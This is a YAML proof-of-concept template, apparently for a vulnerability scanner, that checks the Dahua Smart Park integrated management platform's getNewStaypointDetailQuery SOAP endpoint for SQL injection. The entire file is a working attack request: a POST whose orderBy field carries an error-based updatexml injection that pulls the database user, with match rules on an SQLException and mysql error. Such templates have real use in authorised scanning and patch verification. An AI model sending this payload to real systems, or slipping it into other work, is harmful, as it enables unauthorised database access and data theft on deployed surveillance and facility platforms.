poc/yaml-poc/poc-yaml-大华智慧园区-getNewStaypointDetailQuery-SQL.yaml

name: 大华智慧园区综合管理平台-getNewStaypointDetailQuery-SQL
description: >-
  SQL注入
alwaysExecute: false
matchCount: 1
rules:
  - method: POST
    path: /portal/services/carQuery/getNewStaypointDetailQuery
    headers:
      Content-Type: text/xml  
    body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
        <soapenv:Header/>
        <soapenv:Body>
        <car:getNewStaypointDetailQuery>
        <!--type: string-->
        <searchJson>{}</searchJson>
        <!--type: string-->
        <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)--"}</pageJson>
        <!--type: string-->
        <extend>quae divum incedo</extend>
        </car:getNewStaypointDetailQuery>
        </soapenv:Body>
        </soapenv:Envelope>
    expression:
      status: 500
      body_all:
        - "SQLException"
        - "mysql"